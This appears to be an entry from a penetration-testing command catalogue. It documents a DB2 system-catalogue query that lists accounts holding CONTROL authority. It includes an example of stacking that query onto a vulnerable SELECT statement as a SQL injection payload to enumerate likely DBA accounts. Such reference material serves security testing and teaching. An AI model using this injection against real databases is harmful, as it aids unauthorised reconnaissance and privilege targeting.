---
id: 711e80b8-0aca-4c4b-8d0e-9369fbf57433
name: db2-query-controlauth-users
type: command
executor: sql
data: select distinct(grantee) from sysibm.systabauth where CONTROLAUTH='Y'
output: null
created_at: '2023-04-06T03:56:32.690094+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - Windows
tags:
  - DB2
  - SQL-Injection
  - Account-Enumeration
verified: true
validated: true
---

# db2-query-controlauth-users

## Command

```sql
select distinct(grantee) from sysibm.systabauth where CONTROLAUTH='Y'
```

## Description

This SQL command queries the DB2 system catalog to list unique users or groups granted CONTROL authority on any table. CONTROL authority enables broad database operations, making this useful for identifying potential DBA accounts during enumeration via injection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | Direct query with no parameters; inject into vulnerable SQL context. | N/A |

## Examples

### Basic Usage

In a direct DB2 client:

```sql
select distinct(grantee) from sysibm.systabauth where CONTROLAUTH='Y';
```

### Injected Usage

For SQLi: Append to vulnerable query like SELECT * FROM users WHERE id='1'; [above query] --;

## Expected Output

A list of grantee names, e.g.:

GRANTEE
------
DB2ADMIN
USER1
SYSGRP

If no results, no CONTROL grants exist or access is denied.

## Related

- [[procedures/DB2-List-DBA-Accounts-via-SQL-Injection]]
- [[commands/db2-query-sysadmauth-users]]
